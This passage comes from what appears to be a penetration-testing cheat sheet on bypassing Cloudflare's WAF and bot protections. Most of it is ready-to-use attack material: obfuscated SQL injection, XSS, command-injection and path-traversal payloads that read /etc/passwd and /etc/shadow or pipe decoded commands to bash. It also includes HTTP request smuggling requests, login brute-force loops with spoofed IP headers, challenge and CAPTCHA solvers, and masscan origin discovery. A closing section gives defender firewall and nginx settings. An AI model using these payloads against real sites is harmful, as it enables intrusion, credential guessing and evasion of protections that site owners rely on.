│  ┌───────────────────────────────────────────┐  │
│  │ Layer 2: Managed Rulesets                 │  │
│  │  → CloudFlare Managed Rules               │  │
│  │  → OWASP Core Rule Set (CRS)              │  │
│  │  → Exposed Credentials Check              │  │
│  └───────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────┐  │
│  │ Layer 3: Custom Rules (User-defined)      │  │
│  │  → Custom WAF expressions                 │  │
│  │  → Firewall Rules                         │  │
│  │  → Transform Rules                        │  │
│  └───────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────┐  │
│  │ Layer 4: Bot Management                   │  │
│  │  → JavaScript challenges                  │  │
│  │  → CAPTCHAs (Turnstile)                   │  │
│  │  → Browser integrity checks               │  │
│  └───────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

### SQLi WAF Bypass Payloads

::tabs
  :::tabs-item{icon="i-lucide-database" label="SQL Injection Bypass"}
  ```sql [CloudFlare SQLi WAF Bypass Payloads]
  -- ============================================
  -- CASE MANIPULATION
  -- ============================================
  -- CloudFlare may match case-sensitively on some rules
  /*!50000UniOn*/ /*!50000SeLeCt*/ 1,2,3-- -
  %55nion %53elect 1,2,3-- -
  uNiOn aLl sElEcT 1,2,3-- -
  
  -- ============================================
  -- COMMENT OBFUSCATION
  -- ============================================
  /*!UNION*/ /*!SELECT*/ 1,2,3-- -
  UN/**/ION SE/**/LECT 1,2,3-- -
  UNION/*!50000SELECT*/ 1,2,3-- -
  /*!00000UNION*//*!00000SELECT*/ 1,2,3-- -
  
  -- ============================================
  -- ENCODING BYPASS
  -- ============================================
  -- URL encoding
  %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3-- -
  
  -- Double URL encoding
  %2555%254e%2549%254f%254e %2553%2545%254c%2545%2543%2554 1,2,3-- -
  
  -- Unicode encoding
  %u0055%u004e%u0049%u004f%u004e %u0053%u0045%u004c%u0045%u0043%u0054 1,2,3-- -
  
  -- Hex encoding
  0x554e494f4e 0x53454c454354 1,2,3-- -
  
  -- ============================================
  -- WHITESPACE ALTERNATIVES
  -- ============================================
  UNION%09SELECT%091,2,3-- -       -- Tab
  UNION%0ASELECT%0A1,2,3-- -      -- Newline
  UNION%0BSELECT%0B1,2,3-- -      -- Vertical tab
  UNION%0CSELECT%0C1,2,3-- -      -- Form feed
  UNION%0DSELECT%0D1,2,3-- -      -- Carriage return
  UNION%A0SELECT%A01,2,3-- -      -- Non-breaking space
  UNION(SELECT(1),(2),(3))-- -     -- Parentheses instead of spaces
  
  -- ============================================
  -- FUNCTION ALTERNATIVES
  -- ============================================
  -- Instead of UNION SELECT:
  1 AND 1=2 UNION ALL SELECT 1,2,3-- -
  -1 UNION DISTINCT SELECT 1,2,3-- -
  1 UNION SELECT ALL 1,2,3-- -
  
  -- Instead of information_schema:
  1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- -
  
  -- Version without @@version:
  VERSION()
  /*!VERSION*/()
  
  -- ============================================
  -- MYSQL SPECIFIC BYPASSES
  -- ============================================
  -- MySQL versioned comments (execute only on specific versions)
  1/*!50000UNION*//*!50000ALL*//*!50000SELECT*/1,2,3-- -
  
  -- Backtick wrapping
  `UNION` `SELECT` 1,2,3-- -
  
  -- Scientific notation in numbers
  1e0UNION SELECT 1,2,3-- -
  
  -- Null byte insertion
  1%00UNION%00SELECT 1,2,3-- -
  
  -- ============================================
  -- CLOUDFLARE-SPECIFIC TESTED BYPASSES (2024)
  -- ============================================
  /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3-- -
  %55nion(%53elect 1,2,3)-- -
  +union+distinct+select+1,2,3-- -
  /**//*!12345UNION SELECT*//**/1,2,3-- -
  /**/union/**/select/**/1,2,3-- -
  /*!UnIoN*/+/*!SeLeCt*/+1,2,3-- -
  uni%6fn+se%6cect+1,2,3-- -
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="XSS Bypass"}
  ```html [CloudFlare XSS WAF Bypass Payloads]
  <!-- ============================================ -->
  <!-- BASIC OBFUSCATION -->
  <!-- ============================================ -->
  
  <!-- Case manipulation -->
  <ScRiPt>alert(1)</sCrIpT>
  <SCRIPT>alert(1)</SCRIPT>
  
  <!-- Event handler alternatives -->
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <body onload=alert(1)>
  <video><source onerror=alert(1)>
  <details open ontoggle=alert(1)>
  <marquee onstart=alert(1)>
  <input onfocus=alert(1) autofocus>
  <textarea onfocus=alert(1) autofocus>
  <select onfocus=alert(1) autofocus>
  <keygen onfocus=alert(1) autofocus>
  
  <!-- ============================================ -->
  <!-- ENCODING BYPASS -->
  <!-- ============================================ -->
  
  <!-- HTML entity encoding -->
  <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
  
  <!-- Unicode encoding -->
  <img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
  
  <!-- Hex encoding -->
  <img src=x onerror=\x61\x6c\x65\x72\x74(1)>
  
  <!-- Octal encoding -->
  <img src=x onerror=\141\154\145\162\164(1)>
  
  <!-- ============================================ -->
  <!-- JAVASCRIPT ALTERNATIVES -->
  <!-- ============================================ -->
  
  <!-- Without alert keyword -->
  <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
  <img src=x onerror=window['al'+'ert'](1)>
  <img src=x onerror=self['al'+'ert'](1)>
  <img src=x onerror=top[/al/.source+/ert/.source](1)>
  <img src=x onerror=[].constructor.constructor('alert(1)')()>
  
  <!-- Template literals -->
  <img src=x onerror=alert`1`>
  
  <!-- setTimeout/setInterval -->
  <img src=x onerror=setTimeout('ale'+'rt(1)')>
  <img src=x onerror=setInterval('ale'+'rt(1)')>
  
  <!-- ============================================ -->
  <!-- CLOUDFLARE-SPECIFIC TESTED BYPASSES (2024) -->
  <!-- ============================================ -->
  
  <!-- SVG-based -->
  <svg/onload=alert(1)>
  <svg><animate onbegin=alert(1) attributeName=x dur=1s>
  <svg><set onbegin=alert(1) attributename=x to=1>
  
  <!-- Math-based bypass -->
  <img src=x onerror=location='javas'+'cript:alert(1)'>
  
  <!-- Constructor chain -->
  <img src=x onerror="[].filter.constructor('alert(1)')()">
  
  <!-- Mutation XSS (mXSS) -->
  <noscript><p title="</noscript><img src=x onerror=alert(1)>">
  
  <!-- Comment-based -->
  <!--><svg onload=alert(1)>-->
  
  <!-- URL-based -->
  <a href="javascript:alert(1)">click</a>
  <a href="&#106;avascript:alert(1)">click</a>
  <a href="java&#115;cript:alert(1)">click</a>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Command Injection Bypass"}
  ```bash [CloudFlare Command Injection Bypass]
  # ============================================
  # BASIC OBFUSCATION
  # ============================================
  
  # Concatenation
  ;w'h'o'a'm'i
  ;w"h"o"a"m"i
  ;wh$()oami
  ;who$@ami
  
  # Variable insertion
  ;w${IFS}h${IFS}o${IFS}a${IFS}m${IFS}i
  ;cat${IFS}/etc/passwd
  ;cat$IFS/etc/passwd
  
  # Tab instead of space
  ;cat%09/etc/passwd
  
  # Newline
  ;cat%0a/etc/passwd
  
  # ============================================
  # ALTERNATIVE COMMANDS
  # ============================================
  
  # Instead of cat:
  ;tac /etc/passwd
  ;nl /etc/passwd
  ;head /etc/passwd
  ;tail /etc/passwd
  ;less /etc/passwd
  ;more /etc/passwd
  ;sort /etc/passwd
  ;uniq /etc/passwd
  ;rev /etc/passwd | rev
  ;xxd /etc/passwd
  ;base64 /etc/passwd
  ;curl file:///etc/passwd
  
  # Instead of whoami:
  ;id
  ;w
  ;who
  ;last
  ;echo $USER
  ;printenv USER
  
  # ============================================
  # ENCODING
  # ============================================
  
  # Base64 encoded command
  ;echo d2hvYW1p | base64 -d | bash
  ;bash -c '{echo,d2hvYW1p}|{base64,-d}|bash'
  
  # Hex encoded
  ;echo -e '\x77\x68\x6f\x61\x6d\x69' | bash
  
  # Octal encoded
  ;$(printf '\167\150\157\141\155\151')
  
  # ============================================
  # WILDCARD BYPASS
  # ============================================
  
  ;/???/??t /???/??ss??
  # Resolves to: /bin/cat /etc/passwd
  
  ;/???/??t /???/??????
  # Resolves to: /bin/cat /etc/shadow (if permissions allow)
  
  # ============================================
  # NO-SPACE TECHNIQUES
  # ============================================
  
  ;{cat,/etc/passwd}
  ;cat</etc/passwd
  ;IFS=,;`cat<<<cat,/etc/passwd`
  ```
  :::
::

### Path Traversal WAF Bypass

::collapsible
**CloudFlare Path Traversal Bypass Payloads**

```bash [Path Traversal WAF Bypass]
# ============================================
# ENCODING VARIANTS
# ============================================

# Standard (likely blocked)
../../../etc/passwd

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode encoding
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# UTF-8 overlong encoding
%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd

# Null byte (older systems)
../../../etc/passwd%00.jpg
../../../etc/passwd%00

# ============================================
# PATH NORMALIZATION TRICKS
# ============================================

# Backslash
..\..\..\etc\passwd
..\/..\/..\/etc\/passwd

# Mixed separators
..%5c..%5c..%5cetc%5cpasswd

# Double dots alternatives
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Current directory insertion
./.././.././../etc/passwd
./../.././../.././../../etc/passwd

# ============================================
# WRAPPER BYPASS
# ============================================

# PHP wrappers
php://filter/convert.base64-encode/resource=../../../etc/passwd
php://filter/read=string.rot13/resource=../../../etc/passwd
php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd

# Data wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

# Expect wrapper
expect://whoami
```
::

### Request Smuggling & Protocol-Level Bypass

::tabs
  :::tabs-item{icon="i-lucide-split" label="HTTP Request Smuggling"}
  ```http [HTTP Request Smuggling Against CloudFlare]
  # ============================================
  # CL.TE (Content-Length.Transfer-Encoding)
  # ============================================
  # CloudFlare uses Content-Length, origin uses Transfer-Encoding
  
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 13
  Transfer-Encoding: chunked
  
  0
  
  SMUGGLED_REQUEST_HERE
  
  # ============================================
  # TE.CL (Transfer-Encoding.Content-Length)
  # ============================================
  # CloudFlare uses Transfer-Encoding, origin uses Content-Length
  
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 3
  Transfer-Encoding: chunked
  
  8
  SMUGGLED
  0
  
  
  # ============================================
  # TE.TE (Obfuscated Transfer-Encoding)
  # ============================================
  
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 4
  Transfer-Encoding: chunked
  Transfer-encoding: identity
  
  25
  POST /admin HTTP/1.1
  Host: target.com
  
  0
  
  
  # ============================================
  # HEADER INJECTION
  # ============================================
  
  # Newline in header value
  GET / HTTP/1.1
  Host: target.com
  X-Custom: value%0d%0aX-Injected: malicious
  
  # Oversized headers (exceed WAF inspection buffer)
  GET / HTTP/1.1
  Host: target.com
  X-Padding: AAAA....(8000+ A's)....AAAA
  X-Attack: ' OR 1=1-- -
  ```
  :::

  :::tabs-item{icon="i-lucide-shuffle" label="HTTP/2 & Protocol Tricks"}
  ```bash [Protocol-Level Bypass]
  # ============================================
  # HTTP/2 SPECIFIC BYPASS
  # ============================================
  
  # HTTP/2 header name case sensitivity
  # HTTP/2 requires lowercase headers, but some implementations
  # handle mixed case differently
  
  curl --http2 -H "Transfer-encoding: chunked" https://target.com/
  
  # HTTP/2 pseudo-header injection
  # Use tools like h2csmuggler
  python3 h2csmuggler.py -x https://target.com/ -t http://target.com/admin
  
  # ============================================
  # H2C SMUGGLING (HTTP/2 Cleartext upgrade)
  # ============================================
  
  # https://github.com/BishopFox/h2csmuggler
  git clone https://github.com/BishopFox/h2csmuggler.git
  cd h2csmuggler
  
  # Test for h2c smuggling
  python3 h2csmuggler.py -x https://target.com/ --test
  
  # Smuggle request to bypass WAF
  python3 h2csmuggler.py -x https://target.com/ -H "Host: target.com" -t "http://target.com/admin"
  
  # ============================================
  # CHUNKED ENCODING TRICKS
  # ============================================
  
  # Chunked with extension
  POST /login HTTP/1.1
  Host: target.com
  Transfer-Encoding: chunked
  
  1;attack=payload
  a
  0
  
  
  # Invalid chunk size (decimal vs hex confusion)
  POST /login HTTP/1.1
  Host: target.com
  Transfer-Encoding: chunked
  
  0a    ← Hex for 10, but might be parsed as decimal
  AAAAAAAAAA
  0
  
  
  # ============================================
  # HTTP METHOD OVERRIDE
  # ============================================
  
  # Some WAFs only inspect GET/POST
  curl -X PUT https://target.com/api/users -d "payload"
  curl -X PATCH https://target.com/api/users -d "payload"
  
  # Method override headers
  curl -X POST https://target.com/ \
    -H "X-HTTP-Method-Override: PUT" \
    -H "X-Method-Override: PUT" \
    -H "X-HTTP-Method: PUT"
  ```
  :::
::

---

## Phase 5 — Rate Limit & Bot Protection Bypass

### Rate Limit Bypass

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```bash [Rate Limit Bypass Techniques]
# ============================================
# HEADER MANIPULATION
# ============================================

# CloudFlare may use specific headers for rate limiting
# Try adding/modifying origin IP headers

curl https://target.com/login \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "CF-Connecting-IP: 127.0.0.1" \
  -H "True-Client-IP: 127.0.0.1" \
  -H "X-Forwarded-Host: 127.0.0.1" \
  -H "Forwarded: for=127.0.0.1"

# Rotate through IPs
for i in $(seq 1 255); do
    curl -s -o /dev/null -w "%{http_code}" \
      -H "X-Forwarded-For: 192.168.1.$i" \
      https://target.com/login \
      -d "username=admin&password=test$i"
done

# ============================================
# PATH VARIATION
# ============================================

# Rate limiting may be path-specific
# Try path variations that resolve to same endpoint

curl https://target.com/login
curl https://target.com/LOGIN
curl https://target.com/Login
curl https://target.com/./login
curl https://target.com//login
curl https://target.com/login/
curl https://target.com/login?dummy=1
curl https://target.com/login#fragment
curl https://target.com/%6cogin        # URL-encoded 'l'
curl https://target.com/login;
curl https://target.com/login..;/

# ============================================
# HTTP METHOD VARIATION
# ============================================

# Rate limit may only apply to POST
curl -X GET "https://target.com/login?user=admin&pass=test"
curl -X PUT https://target.com/login -d "user=admin&pass=test"
curl -X PATCH https://target.com/login -d "user=admin&pass=test"

# ============================================
# CONTENT-TYPE VARIATION
# ============================================

# Rate limit may key on content-type
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}'

curl -X POST https://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=test"

curl -X POST https://target.com/login \
  -H "Content-Type: multipart/form-data" \
  -F "username=admin" -F "password=test"

curl -X POST https://target.com/login \
  -H "Content-Type: text/xml" \
  -d "<login><user>admin</user><pass>test</pass></login>"

# ============================================
# UNICODE / ENCODING IN PARAMETERS
# ============================================

# Same parameter, different encoding
curl https://target.com/login -d "username=admin&password=test1"
curl https://target.com/login -d "username=admin&password=test%31"
curl https://target.com/login -d "username=%61dmin&password=test1"
curl https://target.com/login -d "username=Admin&password=test1"
```

#code
```bash
# Quick rate limit test with header rotation
for i in $(seq 1 10); do
    curl -s -o /dev/null -w "%{http_code}\n" \
      -H "X-Forwarded-For: 10.0.0.$i" \
      https://target.com/login
done
```
::

### Bot Protection & JavaScript Challenge Bypass

::tabs
  :::tabs-item{icon="i-lucide-bot" label="Browser Automation"}
  ```python [Selenium-Based CloudFlare Bypass]
  # ============================================
  # UNDETECTED CHROMEDRIVER
  # Bypasses CloudFlare's browser integrity checks
  # ============================================
  
  # pip3 install undetected-chromedriver selenium
  
  import undetected_chromedriver as uc
  import time
  
  # Create undetected Chrome instance
  options = uc.ChromeOptions()
  # options.add_argument('--headless')  # Headless may be detected
  options.add_argument('--no-sandbox')
  options.add_argument('--disable-dev-shm-usage')
  
  driver = uc.Chrome(options=options)
  
  # Navigate to CloudFlare-protected site
  driver.get('https://target.com/')
  
  # Wait for CloudFlare challenge to resolve
  time.sleep(10)  # Usually 5-10 seconds for JS challenge
  
  # Extract cookies (including cf_clearance)
  cookies = driver.get_cookies()
  for cookie in cookies:
      print(f"{cookie['name']}: {cookie['value']}")
  
  # cf_clearance cookie can be reused with curl/requests
  cf_clearance = next(c['value'] for c in cookies if c['name'] == 'cf_clearance')
  
  # Now interact with the page
  page_source = driver.page_source
  print(page_source[:500])
  
  # Use cookies with requests library
  import requests
  session = requests.Session()
  for cookie in cookies:
      session.cookies.set(cookie['name'], cookie['value'])
  
  # User-Agent must match the browser used to get cookies
  user_agent = driver.execute_script("return navigator.userAgent")
  session.headers.update({'User-Agent': user_agent})
  
  response = session.get('https://target.com/api/data')
  print(response.text)
  
  driver.quit()
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="CloudFlare Solver Libraries"}
  ```python [CloudFlare Challenge Solvers]
  # ============================================
  # cloudscraper — Python library
  # ============================================
  
  # pip3 install cloudscraper
  
  import cloudscraper
  
  # Create scraper that handles CloudFlare challenges
  scraper = cloudscraper.create_scraper(
      browser={
          'browser': 'chrome',
          'platform': 'linux',
          'desktop': True,
      }
  )
  
  # Make requests through CloudFlare
  response = scraper.get('https://target.com/')
  print(response.status_code)
  print(response.text[:500])
  
  # POST request
  response = scraper.post('https://target.com/login', data={
      'username': 'admin',
      'password': 'test'
  })
  print(response.text)
  
  # ============================================
  # FlareSolverr — Proxy-based solver
  # ============================================
  
  # Docker deployment
  # docker run -d --name flaresolverr -p 8191:8191 ghcr.io/flaresolverr/flaresolverr:latest
  
  import requests
  
  # Send request through FlareSolverr
  response = requests.post('http://localhost:8191/v1', json={
      'cmd': 'request.get',
      'url': 'https://target.com/',
      'maxTimeout': 60000
  })
  
  result = response.json()
  print(f"Status: {result['solution']['status']}")
  print(f"Cookies: {result['solution']['cookies']}")
  print(f"User-Agent: {result['solution']['userAgent']}")
  
  # Extract cookies for reuse
  cookies = {c['name']: c['value'] for c in result['solution']['cookies']}
  user_agent = result['solution']['userAgent']
  
  # Reuse cookies with regular requests
  session = requests.Session()
  session.cookies.update(cookies)
  session.headers.update({'User-Agent': user_agent})
  r = session.get('https://target.com/api/data')
  print(r.text)
  ```
  :::

  :::tabs-item{icon="i-lucide-cookie" label="Cookie Reuse"}
  ```bash [CloudFlare Cookie Extraction & Reuse]
  # ============================================
  # EXTRACT CF COOKIES FROM BROWSER
  # ============================================
  
  # 1. Open target.com in your browser
  # 2. Pass the CloudFlare challenge manually
  # 3. Open DevTools → Application → Cookies
  # 4. Copy these cookies:
  #    - cf_clearance
  #    - __cf_bm
  #    - Any session cookies
  
  # ============================================
  # REUSE WITH CURL
  # ============================================
  
  curl -sk https://target.com/api/data \
    -H "Cookie: cf_clearance=COOKIE_VALUE; __cf_bm=COOKIE_VALUE" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  
  # IMPORTANT: User-Agent MUST match the browser that generated the cookies!
  
  # ============================================
  # REUSE WITH SQLMAP
  # ============================================
  
  sqlmap -u "https://target.com/page?id=1" \
    --cookie="cf_clearance=COOKIE_VALUE; __cf_bm=COOKIE_VALUE; PHPSESSID=SESSION_VALUE" \
    --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    --random-agent \
    --delay=2 \
    --batch
  
  # ============================================
  # REUSE WITH BURP SUITE
  # ============================================
  
  # 1. Configure browser to proxy through Burp (127.0.0.1:8080)
  # 2. Visit target.com and pass CF challenge in browser
  # 3. Burp now has the cf_clearance cookies in the cookie jar
  # 4. All subsequent Burp requests will include these cookies
  # 5. Use Burp Repeater/Intruder with the CF cookies
  
  # Cookie lifetime:
  # cf_clearance: ~30 minutes (varies by CF plan)
  # __cf_bm: 30 minutes
  # Refresh by revisiting the site in your browser when expired
  ```
  :::
::

### Turnstile CAPTCHA Bypass

::collapsible
**CloudFlare Turnstile Challenge Approaches**

```python [Turnstile CAPTCHA Approaches]
# ============================================
# TURNSTILE CAPTCHA BYPASS APPROACHES
# ============================================

# Method 1: CAPTCHA Solving Services
# These use human workers or AI to solve Turnstile
# - 2Captcha: https://2captcha.com/
# - Anti-Captcha: https://anti-captcha.com/
# - CapSolver: https://www.capsolver.com/

# Example with 2Captcha:
import requests
import time

API_KEY = "YOUR_2CAPTCHA_KEY"
SITE_KEY = "0x4AAAAAAA_TURNSTILE_SITEKEY"  # From page source
TARGET_URL = "https://target.com/login"

# Step 1: Submit CAPTCHA task
task = requests.post("https://2captcha.com/in.php", data={
    "key": API_KEY,
    "method": "turnstile",
    "sitekey": SITE_KEY,
    "pageurl": TARGET_URL,
    "json": 1
}).json()

task_id = task['request']
print(f"Task ID: {task_id}")

# Step 2: Wait for solution
while True:
    time.sleep(5)
    result = requests.get(f"https://2captcha.com/res.php?key={API_KEY}&action=get&id={task_id}&json=1").json()
    if result['status'] == 1:
        token = result['request']
        print(f"Token: {token}")
        break
    print("Waiting...")

# Step 3: Submit form with solved token
response = requests.post(TARGET_URL, data={
    "username": "admin",
    "password": "test",
    "cf-turnstile-response": token
})
print(response.text)

# ============================================
# Method 2: Browser automation (pass challenge once, reuse session)
# See Selenium/undetected-chromedriver examples above
# ============================================

# ============================================
# Method 3: Bypass via API endpoints
# ============================================
# Some applications have API endpoints that don't require
# Turnstile validation even when the web form does
# Test: /api/login, /api/v1/auth, /api/v2/login, etc.
```
::

---

## Phase 6 — Advanced & Alternative Bypass Techniques

### IPv6 Bypass

::note
Many organizations configure CloudFlare only for IPv4 but forget to protect their **IPv6** address. The origin's IPv6 address may be directly accessible.
::

```bash [IPv6 Origin Discovery]
# ============================================
# CHECK FOR IPv6 RECORDS
# ============================================

# Look up AAAA records
dig AAAA target.com +short

# Check if IPv6 resolves to non-CloudFlare
# CloudFlare IPv6 ranges: 2400:cb00::/32, 2606:4700::/32, 2803:f800::/32
# 2405:b500::/32, 2405:8100::/32, 2a06:98c0::/29, 2c0f:f248::/32

# If AAAA record returns non-CloudFlare IPv6 → direct origin access!

# ============================================
# CONNECT VIA IPv6
# ============================================

curl -6 -sk -H "Host: target.com" https://[2001:db8::1]/

# ============================================
# CHECK SUBDOMAINS FOR IPv6
# ============================================

for sub in mail ftp direct api dev staging; do
    ipv6=$(dig AAAA "${sub}.target.com" +short)
    [ -n "$ipv6" ] && echo "${sub}.target.com -> $ipv6"
done
```

### Virtual Host Scanning

```bash [Virtual Host Scanning for Origin]
# ============================================
# If you found the origin IP but it hosts multiple sites
# You need to send the correct Host header
# ============================================

# Brute-force virtual hosts on origin IP
gobuster vhost -u https://203.0.113.50 \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -k

# FFuf vhost scanning
ffuf -u https://203.0.113.50/ \
  -H "Host: FUZZ.target.com" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0

# Manual check
curl -sk -H "Host: target.com" https://203.0.113.50/
curl -sk -H "Host: www.target.com" https://203.0.113.50/
curl -sk -H "Host: api.target.com" https://203.0.113.50/
```

### Cloud Provider Metadata & Same-Provider Discovery

::collapsible
**Cloud Provider Origin Discovery**

```bash [Cloud Provider Discovery]
# ============================================
# CONCEPT: If target uses AWS/GCP/Azure, they might be
# in the same provider as their CloudFlare config
# The origin IP is often in common cloud ranges
# ============================================

# ============================================
# AWS
# ============================================

# Download AWS IP ranges
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | \
  python3 -c "
import json,sys
data = json.load(sys.stdin)
for prefix in data['prefixes']:
    if prefix['region'].startswith('us-east'):
        print(prefix['ip_prefix'])
" > aws_ranges.txt

# If target uses AWS, scan AWS ranges for the origin
# (Only with authorization!)
masscan -iL aws_ranges.txt -p80,443 --rate 1000 -oJ aws_scan.json

# ============================================
# GCP
# ============================================

# GCP IP ranges
curl -s https://www.gstatic.com/ipranges/cloud.json | \
  python3 -c "import json,sys;[print(p['ipv4Prefix']) for p in json.load(sys.stdin)['prefixes'] if 'ipv4Prefix' in p]" > gcp_ranges.txt

# ============================================
# AZURE
# ============================================

# Azure IP ranges (download from Microsoft)
# https://www.microsoft.com/en-us/download/details.aspx?id=56519

# ============================================
# MATCH HOSTING PROVIDER
# ============================================

# Check target's ASN
whois $(dig +short target.com | head -1) | grep -i origin

# Check common hosting for the domain
curl -s "https://api.bgpview.io/ip/$(dig +short target.com | head -1)" | python3 -m json.tool

# BuiltWith — reveals hosting infrastructure
# https://builtwith.com/target.com
```
::

---

## Origin Protection — How to Prevent Bypass

::tip
This section is for **blue team / defenders** — how to properly configure CloudFlare and your origin server to prevent these bypass techniques.
::

::accordion
  :::accordion-item{icon="i-lucide-shield" label="1. Restrict Origin Access to CloudFlare IPs Only"}
  ```bash [Origin Firewall — CloudFlare IPs Only]
  # ============================================
  # IPTABLES — Allow only CloudFlare IPs
  # ============================================
  
  #!/bin/bash
  # Download CloudFlare IP ranges
  CF_IPS=$(curl -s https://www.cloudflare.com/ips-v4)
  CF_IPS6=$(curl -s https://www.cloudflare.com/ips-v6)
  
  # Flush existing HTTP/HTTPS rules
  iptables -D INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null
  iptables -D INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null
  
  # Allow CloudFlare IPs only for web traffic
  for ip in $CF_IPS; do
      iptables -A INPUT -p tcp --dport 80 -s $ip -j ACCEPT
      iptables -A INPUT -p tcp --dport 443 -s $ip -j ACCEPT
  done
  
  for ip in $CF_IPS6; do
      ip6tables -A INPUT -p tcp --dport 80 -s $ip -j ACCEPT
      ip6tables -A INPUT -p tcp --dport 443 -s $ip -j ACCEPT
  done
  
  # Drop all other HTTP/HTTPS traffic
  iptables -A INPUT -p tcp --dport 80 -j DROP
  iptables -A INPUT -p tcp --dport 443 -j DROP
  
  # Save rules
  iptables-save > /etc/iptables/rules.v4
  
  # ============================================
  # NGINX — Restrict to CloudFlare IPs
  # ============================================
  
  # /etc/nginx/conf.d/cloudflare-only.conf
  # Allow CloudFlare IPs
  allow 173.245.48.0/20;
  allow 103.21.244.0/22;
  allow 103.22.200.0/22;
  allow 103.31.4.0/22;
  allow 141.101.64.0/18;
  allow 108.162.192.0/18;
  allow 190.93.240.0/20;
  allow 188.114.96.0/20;
  allow 197.234.240.0/22;
  allow 198.41.128.0/17;
  allow 162.158.0.0/15;
  allow 104.16.0.0/13;
  allow 104.24.0.0/14;
  allow 172.64.0.0/13;
  allow 131.0.72.0/22;
  deny all;
  ```
  :::

  :::accordion-item{icon="i-lucide-key" label="2. Use Authenticated Origin Pulls"}
  ```bash [CloudFlare Authenticated Origin Pulls]
  # ============================================
  # CloudFlare presents a CLIENT CERTIFICATE to your origin
  # Origin only accepts requests with valid CF client cert
  # ============================================
  
  # 1. Enable in CloudFlare Dashboard:
  #    SSL/TLS → Origin Server → Authenticated Origin Pulls → ON
  
  # 2. Download CloudFlare's Origin CA certificate:
  #    https://developers.cloudflare.com/ssl/origin-configuration/authenticated-origin-pull/
  
  # 3. Configure Nginx to require client certificate:
  
  # /etc/nginx/sites-available/target.com
  server {
      listen 443 ssl;
      server_name target.com;
      
      ssl_certificate /etc/ssl/certs/target.com.pem;
      ssl_certificate_key /etc/ssl/private/target.com.key;
      
      # Require CloudFlare client certificate
      ssl_client_certificate /etc/ssl/cloudflare-origin-pull-ca.pem;
      ssl_verify_client on;
      
      # Reject requests without valid CF cert
      if ($ssl_client_verify != SUCCESS) {
          return 403;
      }
  }
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="3. Prevent IP Leakage"}
  ```bash [Prevent Origin IP Leakage]
  # ============================================
  # DNS CONFIGURATION
  # ============================================
  
  # Proxy ALL subdomains through CloudFlare (orange cloud)
  # Don't leave any A/AAAA records unproxied
  # Check: dig ANY target.com — should only show CF IPs
  
  # Use CloudFlare for MX if possible
  # Or use a separate IP for mail server
  
  # ============================================
  # REMOVE HISTORICAL DNS
  # ============================================
  # You can't remove historical records, but you can:
  # 1. Change origin IP after moving to CloudFlare
  # 2. Use a new IP address that was never in DNS
  # 3. Use cloud provider's internal networking
  
  # ============================================
  # EMAIL CONFIGURATION
  # ============================================
  
  # Use external email service (Gmail, O365, etc.)
  # Don't run mail server on same IP as web server
  # SPF record should NOT contain origin IP
  
  # ============================================
  # OUTBOUND CONNECTION PROTECTION
  # ============================================
  
  # Don't make outbound HTTP requests from web server
  # Use a proxy or separate service for URL fetching
  # Validate and sanitize all URLs before fetching
  
  # ============================================
  # SSL CERTIFICATE
  # ============================================
  
  # Use CloudFlare Origin CA certificate (not public CA)
  # This way, cert won't appear in CT logs with your origin IP
  # CloudFlare Dashboard → SSL/TLS → Origin Server → Create Certificate
  
  # ============================================
  # SERVER HEADERS
  # ============================================
  
  # Don't leak server info in headers
  # Nginx:
  server_tokens off;
  # Remove: X-Powered-By, Server version headers
  proxy_hide_header X-Powered-By;
  more_clear_headers Server;
  ```
  :::

  :::accordion-item{icon="i-lucide-lock" label="4. Additional Protections"}
  ```yaml [Complete Origin Protection Checklist]
  Origin Protection Checklist:
    Firewall:
      - Only allow CloudFlare IP ranges to ports 80/443
      - Block all direct HTTP/HTTPS from non-CF IPs
      - Use cloud provider security groups for additional filtering
      
    Authentication:
      - Enable Authenticated Origin Pulls (client cert)
      - Use CloudFlare Tunnel (Argo Tunnel) — no public IP needed
      - Validate CF-Connecting-IP header on origin
      
    DNS:
      - Proxy ALL DNS records through CloudFlare
